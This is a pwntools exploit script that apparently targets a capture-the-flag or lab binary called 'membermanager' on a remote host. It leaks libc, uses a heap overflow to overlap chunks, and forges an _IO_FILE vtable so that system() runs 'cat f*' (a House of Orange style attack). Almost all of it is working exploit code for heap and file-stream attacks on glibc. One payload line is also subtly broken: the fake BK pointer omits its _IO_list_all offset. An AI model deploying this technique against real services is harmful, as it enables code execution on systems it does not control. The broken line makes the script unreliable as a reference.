from pwn import *
 
#context.log_level = 'debug'
#http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
#http://4ngelboy.blogspot.tw/2017/11/play-with-file-structure-yet-another.html
 
p = remote('securewebinc.jet', 5555)
#p = process('./membermanager')
binary = ELF('./membermanager')
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.28.so'), won't work cause fucking tcachebins
 
def alloc(size, data):
    p.sendline('1')
    p.sendlineafter('size: ', str(size))
    p.sendafter('username: ', data)
    p.recvrepeat(0.1)
 
def edit(index, mode, data):
    p.sendline('2')
    p.sendlineafter('insecure edit', str(mode))
    p.recvrepeat(0.1)
    p.sendline(str(index))
    p.sendafter('new username: ', data)
    p.recvrepeat(0.1)
 
def ban(index):
    p.sendline('3')
    p.sendlineafter('index: ', str(index))
    p.recvrepeat(0.1)
 
def changeName(name):
    p.sendline('4')
    p.recvrepeat(0.1)
    p.sendline(name)
    p.recvrepeat(0.1)
 
def enterName(name):
    p.send(name)
    p.recvrepeat(0.1)
 
def leaklibc():
    p.sendline('5')
    temp = p.recvuntil('Member manager!')
    temp = temp.split('\n')[1]
    p.recvrepeat(0.1)
    return int(temp)
 
enterName('Mr. Fizz')
#libc leak
readLeak = leaklibc()
log.info('Leaked read address: ' + hex(readLeak))
libcBase = readLeak - libc.symbols['read']
log.info('Leaked libc base: ' + hex(libcBase))
#make 4 chunks
#chunk 0 -> we use this to overflow
#chunk 1 -> this will be overflowed, make it at least 0x101 so we control 2 bytes
#chunk 2 -> chunk to be messed with and freed into unsorted
#chunk 3 -> prevent consolidation with top chunk
alloc(0x88, 'A' * 0x88) #read fills it all up, when insecure edit, can overflow
alloc(0x100, 'B' * 0x80) #0x100 plus 16 bytes of metadata -> 0x110
#this chunk will be forged to help in unsorted bin attack... there are checks involved to check valid sizes
fakechunkpad = 'C' * 0x160
fakechunkpayload = p64(0) + p64(0x21) #fastbin size
alloc(0x500, fakechunkpad + fakechunkpayload) #0x510 is real size
alloc(0x88, 'D' * 0x80) #prevent top consolidation
#now free lol, to help start the unsorted bin attack
ban(2)
log.info('Overflowing chunks')
#now overflow
edit(0, 2, 'A' * 0x88 + p64(0x110 + 0x10 + 0x160 + 0x1)) #so chunk 1 size + chunk metadata size + fakechunkpad size + 0x1 (for prev in use bit)
#chunks successfully overlapped!
log.info('Chunks overlapped')
#now mess with IO_file structs to change something in vtable so when a file read/input/output function is called, triggers a shell
#make it call something at like name perhaps
changeName(p64(0) * 3 + p64(libcBase + libc.symbols['system'])) #padding + system
#we can start crafting the fake _IO_FILE to satisfy the first part of the check within _IO_flush_all_lockup() function
#condition to get:  fp->_IO_write_ptr > fp->_IO_write_base
log.info('Messing with IO vt table')
nameLocation = 0x6020a0 #constant cause BSS and no PIE
IO_list_all = 0x3c5520
payload = "B" * 8*32                # overflow to victim chunk using secure edit
payload += 'cat f*\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(libcBase +  - 0x10) # fake BK
payload += p64(2)                   # fp->_IO_write_base
payload += p64(3)                   # fp->_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(nameLocation)            # fake *vtable
edit(1, 1, payload)                 # use secure edit
#/bin/sh in previous field because: prev_size (start of the chunk) was passed in RDI register, so say, an argument to system() later.
log.info('Overrode vt table')
log.info('Triggering unsorted bin attack')
p.recvrepeat(0.1)
p.sendline('1')
p.recvrepeat(0.1)
p.sendline(str(0x80))
p.interactive()